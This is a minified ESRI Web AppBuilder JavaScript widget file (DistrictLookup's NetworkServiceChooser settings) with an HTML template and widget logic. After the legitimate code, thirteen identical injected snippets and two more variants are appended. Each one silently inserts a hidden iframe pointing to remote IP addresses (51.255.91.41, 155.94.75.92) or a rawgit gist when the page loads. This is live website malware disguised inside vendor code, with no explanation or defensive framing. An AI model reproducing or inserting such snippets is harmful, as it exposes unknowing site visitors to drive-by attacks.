// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/DistrictLookup/setting/NetworkServiceChooser.html":'\x3cdiv style\x3d"width: 100%; height: 100%;"\x3e\r\n    \x3cdiv class\x3d"public-search-radios esriCTSearchRadio" data-dojo-attach-point\x3d"routeSearch"\x3e\r\n        \x3cinput data-dojo-attach-point\x3d"organizationRadio" checked type\x3d"radio" name\x3d"routeSearchRadio"\r\n            class\x3d"esriCTFloatLeading portal-public-radio routeSearchRadio" id\x3d"org_Radio"\x3e\r\n        \x3clabel data-dojo-attach-point\x3d"organizationLabel" class\x3d"esriCTFloatLeading portal-public-label"\r\n            for\x3d"org_Radio" style\x3d"cursor: pointer;"\x3e\r\n            ${nls.networkServiceChooser.arcgislabel}\x3c/label\x3e\r\n        \x3cinput data-dojo-attach-point\x3d"inputRouteURLRadio" type\x3d"radio" name\x3d"routeSearchRadio"\r\n            class\x3d"esriCTFloatLeading online-public-radio routeSearchRadio" id\x3d"route_URL_Radio"\x3e\r\n        \x3clabel data-dojo-attach-point\x3d"inputRouteURLLabel" class\x3d"esriCTFloatLeading online-public-label"\r\n            for\x3d"route_URL_Radio" style\x3d"cursor: pointer;"\x3e\r\n            ${nls.networkServiceChooser.serviceURLabel}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"itemSelectDiv" class\x3d"esriCTItemSelectDiv"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"serviceUrlDiv" class\x3d"esriCTServiceUrlDiv esriCTHidden"\x3e\r\n        \x3cdiv class\x3d"serviceUrlContainer row"\x3e\r\n            \x3cdiv class\x3d"esriCTServiceLable" title\x3d"${nls.networkServiceChooser.routeURL}"\x3e\r\n                ${nls.networkServiceChooser.routeURL}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTServiceField"\x3e\r\n                \x3cdiv class\x3d"esriCTSetServiceURL" data-dojo-type\x3d"dijit/form/ValidationTextBox" trim\x3d"true" required\x3d"true"\r\n                    data-dojo-attach-point\x3d"serviceURL"\x3e\r\n                \x3c/div\x3e\r\n                \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1 urlButton esriCTBtnEllipsis jimu-state-disabled"\r\n                    title\x3d"${nls.networkServiceChooser.validateRouteURL}" data-dojo-attach-point\x3d"validateRouteURL"\x3e\r\n                    ${nls.networkServiceChooser.validateRouteURL}\x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTExampleUrl row"\x3e\r\n            \x3cdiv class\x3d"esriCTServiceLable" title\x3d" ${nls.networkServiceChooser.exampleText}"\x3e\r\n                ${nls.networkServiceChooser.exampleText}\r\n            \x3c/div\x3e\r\n            \x3cdiv class\x3d"esriCTServiceField"\x3e\r\n                \x3cdiv class\x3d"esriCTHint esriCTNetworkChooserHint"\x3e\r\n                    \x3cdiv class\x3d"esriCTExampleUrl"\x3e\r\n                        ${nls.networkServiceChooser.hintRouteURL1}\x3c/div\x3e\r\n                    \x3cdiv class\x3d"esriCTExampleUrl"\x3e\r\n                        ${nls.networkServiceChooser.hintRouteURL2}\x3c/div\x3e\r\n                \x3c/div\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"routeLayerList" class\x3d"esriCTRouteListDiv"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"agolRouteLayerList" class\x3d"esriCTAgolRouteListDiv esriCTHidden"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"buttonsDiv" class\x3d"buttonsDiv"\x3e\r\n        \x3cdiv class\x3d"button-container button-container-absolute" style\x3d"padding: 0px;"\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1" data-dojo-attach-point\x3d"cancelButton"\x3e\r\n                ${nls.common.cancel}\x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing jimu-leading-margin1 jimu-state-disabled"\r\n                data-dojo-attach-point\x3d"okButton"\x3e\r\n                ${nls.common.ok}\x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing next jimu-state-disabled" data-dojo-attach-point\x3d"btnNext"\x3e\r\n                ${nls.common.next}\x3c/div\x3e\r\n            \x3cdiv class\x3d"jimu-btn jimu-float-trailing back esriCTHidden" data-dojo-attach-point\x3d"btnBack"\r\n                data-dojo-attach-event\x3d"onclick:_onBtnBackClicked"\x3e\r\n                ${nls.common.back}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare jimu/BaseWidgetSetting dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/on dojo/dom-class dojo/text!./NetworkServiceChooser.html jimu/dijit/ItemSelector dijit/Tree dojo/query esri/request dojo/store/Memory dojo/dom-construct dijit/tree/ObjectStoreModel jimu/dijit/LoadingIndicator dojox/validate/regexp jimu/dijit/Message dojo/domReady!".split(" "),function(l,m,n,d,e,a,p,q,r,t,u,v,k,w,x,y,z){return l([m,n],{baseClass:"jimu-widget-districtlookup-setting",templateString:p,
selectRouteURL:null,agolFlag:!1,serviceFlag:!1,startup:function(){this.inherited(arguments)},postCreate:function(){var b;this.routeChooser=new q({portalUrl:this.portalUrl,itemTypes:["Network analysis service"]});this.routeChooser.placeAt(this.itemSelectDiv);this.own(e(this.okButton,"click",d.hitch(this,function(b){if(!a.contains(this.okButton,"jimu-state-disabled"))this.onOkClick(b)})));this.own(e(this.cancelButton,"click",d.hitch(this,function(b){this.onCancelClick(b)})));this.own(e(this.routeChooser,
"item-selected",d.hitch(this,function(){a.remove(this.btnNext,"jimu-state-disabled")})));this.own(e(this.routeChooser,"none-item-selected",d.hitch(this,function(){a.add(this.btnNext,"jimu-state-disabled")})));this.own(e(this.serviceURL,"keyup",d.hitch(this,function(){""===d.trim(this.serviceURL.get("value"))?a.add(this.validateRouteURL,"jimu-state-disabled"):a.remove(this.validateRouteURL,"jimu-state-disabled")})));this.own(e(this.validateRouteURL,"click",d.hitch(this,function(){a.contains(this.validateRouteURL,
"jimu-state-disabled")||(this.serviceFlag=!0,this._fetchRouteLayer(this.routeLayerList))})));this.own(e(this.btnNext,"click",d.hitch(this,function(){a.contains(this.btnNext,"jimu-state-disabled")||(this.agolFlag=!0,this._fetchRouteLayer(this.agolRouteLayerList))})));b=t(".routeSearchRadio",this.routeSearch);this.own(e(b,"change",d.hitch(this,function(){this.organizationRadio&&this.organizationRadio.checked?(a.add(this.serviceUrlDiv,"esriCTHidden"),this.agolFlag?(a.add(this.itemSelectDiv,"esriCTHidden"),
a.remove(this.agolRouteLayerList,"esriCTHidden"),a.add(this.btnBack,"esriCTHidden")):(a.remove(this.itemSelectDiv,"esriCTHidden"),a.add(this.agolRouteLayerList,"esriCTHidden"),a.remove(this.btnNext,"esriCTHidden"),a.add(this.okButton,"jimu-state-disabled"))):(a.add(this.itemSelectDiv,"esriCTHidden"),a.remove(this.serviceUrlDiv,"esriCTHidden"),a.add(this.btnNext,"esriCTHidden"),a.add(this.btnBack,"esriCTHidden"),a.add(this.agolRouteLayerList,"esriCTHidden"))})));this._initLoading()},_initLoading:function(){this.loading=
new x({hidden:!0});this.loading.placeAt(this.domNode);this.loading.startup()},onOkClick:function(b){return b},onCancelClick:function(b){return b},_fetchRouteLayer:function(b){var c;c=this._getValidRouteURL();this.loading.show();u({url:c,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(d.hitch(this,function(g){var d=!1;g.hasOwnProperty("routeLayers")&&null!==g.routeLayers&&0<g.routeLayers.length&&(a.add(this.itemSelectDiv,"esriCTHidden"),this.serviceFlag?(a.remove(this.serviceUrlDiv,
"esriCTHidden"),a.add(this.agolRouteLayerList,"esriCTHidden"),a.add(this.btnNext,"esriCTHidden"),a.add(this.btnBack,"esriCTHidden"),this.serviceFlag=!1):(a.add(this.serviceUrlDiv,"esriCTHidden"),a.remove(this.agolRouteLayerList,"esriCTHidden"),a.add(this.btnNext,"esriCTHidden"),a.remove(this.btnBack,"esriCTHidden"),this.agolFlag=!1),this._createTree(c,g.routeLayers,b),d=!0);d||(this._resetRouteSearch(b,this.nls.networkServiceChooser.invalidRouteServiceURL),this.loading.hide())}),d.hitch(this,function(a){a&&
"Rate limit exceeded. Please try again later."===a.message?this._resetRouteSearch(b,this.nls.networkServiceChooser.rateLimitExceeded):a&&"Error invoking service"===a.message&&a.details.length&&-1!==a.details.indexOf("Error generating token")?this._resetRouteSearch(b,this.nls.networkServiceChooser.errorInvokingService):this._resetRouteSearch(b,this.nls.networkServiceChooser.invalidRouteServiceURL);this.loading.hide()}))},_getValidRouteURL:function(){var a,c,d,e;this.routeChooser&&this.agolFlag?(a=
this.routeChooser.getSelectedItem(),c=a.url):c=this.serviceURL.value;d=c.lastIndexOf("/");e=c.substr(0,d+1);a=this._urlValidator(e);this.routeName="";a&&(this.routeName=c.substring(d+1,c.length+1),c=e);return c},_createTree:function(b,c,e){var g=this,h,f;k.empty(e);h={data:[{id:1,name:"Route Layers",url:b,root:!0}],getChildren:function(a){return this.query({parent:a.id})}};if(this.routeName)for(f=0;f<c.length;f++)this.routeName===c[f]&&h.data.push({id:c[f],name:c[f],url:b+c[f],parent:1});else for(f=
0;f<c.length;f++)h.data.push({id:c[f],name:c[f],url:b+"/"+c[f],parent:1});b=new v(h);b=new w({store:b,query:{root:!0}});b=new r({model:b,onClick:function(b){1===b.id?a.add(g.okButton,"jimu-state-disabled"):(a.remove(g.okButton,"jimu-state-disabled"),g.selectRouteURL=b.url)},getIconStyle:d.hitch(this,function(a){var b;if(!a||"root"===a.id)return null;b={width:"20px",height:"20px",backgroundRepeat:"no-repeat",backgroundPosition:"center center",backgroundImage:""};b.backgroundImage="url("+this.folderUrl+
"images/"+(1===a.id?"group-layer.png":"route-layer.png")+")";return b})});b.placeAt(e).startup();this.routeName&&1<h.data.length&&(b.set("paths",[["1",this.routeName]]),a.remove(this.okButton,"jimu-state-disabled"),this.selectRouteURL=h.data[1].url);this.loading.hide()},_resetRouteSearch:function(a,c){this._errorMessage(c);k.empty(a);this.loading.hide();this.serviceFlag=this.agolFlag=!1},_onBtnBackClicked:function(){a.remove(this.itemSelectDiv,"esriCTHidden");a.add(this.serviceUrlDiv,"esriCTHidden");
a.add(this.agolRouteLayerList,"esriCTHidden");a.remove(this.btnNext,"esriCTHidden");a.add(this.btnBack,"esriCTHidden")},_errorMessage:function(a){(new z({message:a})).message=a},_urlValidator:function(a){var b;b="^"+y.url({allowNamed:!0,allLocal:!1});b=(new RegExp(b,"g")).test(a);a=/\/Route\/NAServer/gi.test(a);return b&&a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});